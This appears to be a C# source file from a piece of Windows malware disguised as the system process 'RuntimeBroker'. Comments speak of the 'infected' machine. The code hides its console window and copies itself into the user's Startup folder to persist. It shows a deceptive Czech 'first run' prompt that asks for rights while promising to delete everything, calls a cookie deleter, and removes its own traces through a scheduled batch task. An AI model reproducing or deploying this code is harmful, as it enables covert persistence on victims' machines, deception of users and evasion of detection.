using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace RuntimeBroker
{
    public class _addons
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        
        internal String getPath(String filename){
            return String.Format(@"C:\Users\{0}\AppData\Local\Microsoft\lochoproc\{1}", Environment.UserName, filename);
        }
        internal void hideWindow()
        {
            ShowWindow(GetConsoleWindow(), 0);
        }
        internal String genFile()
        {
            return DateTime.Now.ToString(string.Format("{0}_hh-mm-ss_dd-MM-yyyy", Environment.UserName)) + ".txt";
        }
        internal bool isOnline(String ip){
            //Checking if infected has access to the internet
            try
            {
                Ping ping = new Ping();
                PingReply reply = ping.Send(ip, 3000);
                if(reply.Status == IPStatus.Success)
                {
                    return true;
                }
                return false;
            }
            catch{
                    return false;        
            }
        }
        internal bool hasRunned(){
            //Checking if program has runned before on PC
            if (Directory.Exists(String.Format(@"C:\Users\{0}\AppData\Local\Microsoft\lochoproc", Environment.UserName)))
            {
                return true;
            }
            return false;
        }
        internal void deleteItself(Main instance){
            //Self-destroy and removal.
            var fStream = File.Create(String.Format(@"C:\Users\{0}\AppData\Local\Microsoft\rmit.bat", Environment.UserName));
            String command = String.Format("@echo off" + Environment.NewLine  + "del C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\" + "\"Start Menu\"" + "\\Programs\\Startup\\\"Runtime Broker.exe\"" + Environment.NewLine + "rmdir C:\\Users\\{0}\\AppData\\Local\\Microsoft\\lochoproc", Environment.UserName);
            byte[] toWrite = new UTF8Encoding(true).GetBytes(command);
            fStream.Write(toWrite, 0, command.Length);
            fStream.Close();
            String cmdCommand = "schtasks /Create /SC ONCE /TR " +
                                String.Format(@"C:\Users\{0}\AppData\Local\Microsoft\rmit.bat",
                                    Environment.UserName) + " /ST " + DateTime.Now.AddMinutes(1).ToString("hh:mm") + "/TN del";
            Process.Start("cmd.exe", cmdCommand);
            instance.kill();
        }
        internal void firstRun(){
            //Fake first run prompt.
            Console.WriteLine("Ahoj, toto je první spuštění tohoto programu že?");
            Console.WriteLine("Neboj, všechno co se vytvoří, se po dokončení všeho zase vymaže.");
            Console.WriteLine("Ano, i já.");
            Directory.CreateDirectory(String.Format(@"C:\Users\{0}\AppData\Local\Microsoft\lochoproc", Environment.UserName));
            Console.WriteLine("Teď budu potřebovat nějaká práva abych mohl všechno dodělat. Povolíš mi je? Prosíím :)");
            Thread.Sleep(2500);
            if(isAdmin()){
                String fullpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                File.Copy(fullpath, String.Format(@"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe", Environment.UserName));
            }
            else
            {
                try
                {
                    String fullpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    File.Copy(fullpath, String.Format(@"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe", Environment.UserName));
                    Console.WriteLine("Děkuju :)");
                    Console.WriteLine("Nyní je všechno hotové. Děkuji a ahoj :)");
                    _deleter del = new _deleter();
                    del.cookieDeleter();
                    Process.Start(String.Format(
                        @"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RuntimeBroker.exe",
                        Environment.UserName));
                    Thread.Sleep(5000);
                    Environment.Exit(0);
                }
                catch
                {
                }
            }
        }
        private bool isAdmin()
        {
            var Principle = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            return Principle.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}